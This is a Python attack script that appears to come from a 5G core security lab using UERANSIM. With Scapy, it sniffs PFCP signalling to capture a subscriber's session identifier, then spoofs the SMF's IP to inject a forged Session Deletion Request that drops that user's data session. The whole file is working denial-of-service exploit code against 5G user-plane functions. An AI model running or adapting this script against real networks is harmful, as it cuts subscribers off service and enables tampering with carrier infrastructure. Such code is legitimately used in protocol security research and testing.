# scenario_6_dynamic_deletion_v6_final.py
import re
import socket
import struct
import time
from threading import Thread, Event
from scapy.all import *

# --- USER CONFIGURATION ---
KALI_INTERFACE = "eth0"
PFCP_PORT = 8805

# --- Global Data Store & Sync Event ---
VICTIM_SESSION_DATA = {}
RECON_COMPLETE = Event()

def get_mac(ip_address):
    """
    Resolves the MAC address for a given IP address on the local network segment.
    """
    try:
        # Send an ARP request packet and wait for a response.
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, verbose=0, iface=KALI_INTERFACE)
        if ans:
            return ans[0][1].hwsrc
    except Exception as e:
        print(f"[!] Could not resolve MAC for {ip_address}: {e}")
    # Fallback to broadcast MAC if resolution fails.
    return "ff:ff:ff:ff:ff:ff"

def session_recon_handler(pkt):
    """
    Statefully sniffs for a matching Establishment Request/Response pair
    by locking onto a sequence number to prevent race conditions.
    """
    global VICTIM_SESSION_DATA
    if RECON_COMPLETE.is_set():
        return

    if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(Raw) and pkt[UDP].dport == PFCP_PORT):
        return

    raw_pfcp = pkt.getlayer(Raw).load
    
    try:
        # PFCP Session Establishment Request (Type 50)
        if raw_pfcp[0] == 0x21 and raw_pfcp[1] == 0x32:
            if 'seq_num' not in VICTIM_SESSION_DATA:
                print("[+] Detected Session Establishment Request. Locking onto transaction...")
                seq_num = int.from_bytes(raw_pfcp[12:15], 'big')
                VICTIM_SESSION_DATA['seq_num'] = seq_num
                VICTIM_SESSION_DATA['smf_ip_to_spoof'] = pkt[IP].src

        # PFCP Session Establishment Response (Type 51)
        elif raw_pfcp[0] == 0x21 and raw_pfcp[1] == 0x33:
            if 'seq_num' in VICTIM_SESSION_DATA:
                resp_seq_num = int.from_bytes(raw_pfcp[12:15], 'big')
                # Check if this response matches our locked transaction
                if resp_seq_num == VICTIM_SESSION_DATA['seq_num'] and 'victim_upf_seid' not in VICTIM_SESSION_DATA:
                    print("[+] Detected MATCHING Session Establishment Response.")
                    VICTIM_SESSION_DATA['upf_ip_target'] = pkt[IP].src
                    
                    # The UPF's F-SEID is the key we need to target the session.
                    fseid_ie_pattern = re.compile(b'\x00\x39' + b'..' + b'.' + b'(.{8})')
                    match = fseid_ie_pattern.search(raw_pfcp)
                    if match:
                        VICTIM_SESSION_DATA['victim_upf_seid'] = int.from_bytes(match.group(1), 'big')
                        
                        # Verify we have everything before stopping
                        if all(k in VICTIM_SESSION_DATA for k in ['smf_ip_to_spoof', 'upf_ip_target', 'victim_upf_seid']):
                            print("[+] Reconnaissance complete! All matched keys captured.")
                            RECON_COMPLETE.set()
    except Exception as e:
        print(f"[!] Error during packet parsing: {e}")

def craft_and_send_deletion_request(smf_ip, upf_ip, upf_seid, upf_mac):
    """
    Crafts and sends a forged PFCP Session Deletion Request that is structurally
    identical to the real SMF's request (i.e., it has no message body).
    """
    # The real SMF sends a request with NO body. The length is 12, which accounts
    # for the 8-byte SEID field and 4-byte Sequence Number field in the header.
    message_body_len = 12
    sequence_number = 999 # This can be an arbitrary number for the attack

    # PFCP Header: Version 1, S-Flag=1, Type 54 (Deletion Request)
    header = (
        b"\x21\x36" +
        struct.pack('!H', message_body_len) +
        struct.pack('!Q', upf_seid) + # The UPF's SEID for the session to delete
        sequence_number.to_bytes(3, 'big') + b'\x00'
    )
    
    # The payload is ONLY the header, as observed in the real packet.
    pfcp_payload = header
    
    # We must craft the full Layer 2 (Ethernet) frame to ensure the spoofed
    # IP packet is delivered correctly by the virtual switch.
    packet = (
        Ether(dst=upf_mac, src=get_if_hwaddr(KALI_INTERFACE)) /
        IP(src=smf_ip, dst=upf_ip) /
        UDP(sport=PFCP_PORT, dport=PFCP_PORT) /
        Raw(load=pfcp_payload)
    )

    print("\n--- Injecting Forged Deletion Packet (Bodyless) ---")
    packet.show2()
    
    # Use sendp to send the packet at Layer 2
    sendp(packet, iface=KALI_INTERFACE, verbose=0)
    print("\n[+] Forged packet sent successfully!")

if __name__ == "__main__":
    print("[*] Starting Attack Scenario 6: Dynamic PFCP Session Deletion")
    
    VICTIM_SESSION_DATA.clear()
    RECON_COMPLETE.clear()
    
    print("[*] Phase 1: Sniffing for a fresh, matched session to delete...")

    # Run the sniffer in a background thread so the main script doesn't block
    sniffer_thread = Thread(
        target=sniff,
        kwargs={
            'iface': KALI_INTERFACE,
            'filter': f"udp and port {PFCP_PORT}",
            'prn': session_recon_handler,
            'stop_filter': lambda p: RECON_COMPLETE.is_set()
        },
        daemon=True
    )
    sniffer_thread.start()

    print("[*] Waiting for a UE to connect...")
    # The main thread waits here until the RECON_COMPLETE event is set by the sniffer
    recon_successful = RECON_COMPLETE.wait(timeout=45)

    if not recon_successful:
        print("\n[!] Timed out waiting for a session. Please ensure a UE is connecting and traffic is visible on the interface.")
        exit()

    if 'victim_upf_seid' not in VICTIM_SESSION_DATA or 'smf_ip_to_spoof' not in VICTIM_SESSION_DATA:
        print("\n[!] Sniffer stopped but did not capture all required session data. Aborting.")
        exit()

    spoofed_smf_ip = VICTIM_SESSION_DATA["smf_ip_to_spoof"]
    target_upf_ip = VICTIM_SESSION_DATA["upf_ip_target"]
    victim_upf_seid = VICTIM_SESSION_DATA["victim_upf_seid"]

    print("\n[*] Resolving UPF MAC address...")
    target_upf_mac = get_mac(target_upf_ip)
    if target_upf_mac == "ff:ff:ff:ff:ff:ff":
        print(f"[!] Warning: Could not resolve MAC for UPF {target_upf_ip}. This may fail if the UPF is not in the ARP cache.")
    else:
        print(f"[+] UPF MAC resolved to: {target_upf_mac}")
    
    print("\n--- Victim Information Extracted ---")
    print(f"[*] Identity to Spoof (Real SMF): {spoofed_smf_ip}")
    print(f"[*] Target UPF:                   {target_upf_ip}")
    print(f"[*] Target Session (UPF SEID):    {hex(victim_upf_seid)}")
    print("------------------------------------\n")

    input("[?] Press Enter to send the forged Session Deletion Request...")
    
    craft_and_send_deletion_request(
        spoofed_smf_ip,
        target_upf_ip,
        victim_upf_seid,
        target_upf_mac
    )

    print("[***] CHECK YOUR UERANSIM VM. The ping should now be failing. [***]")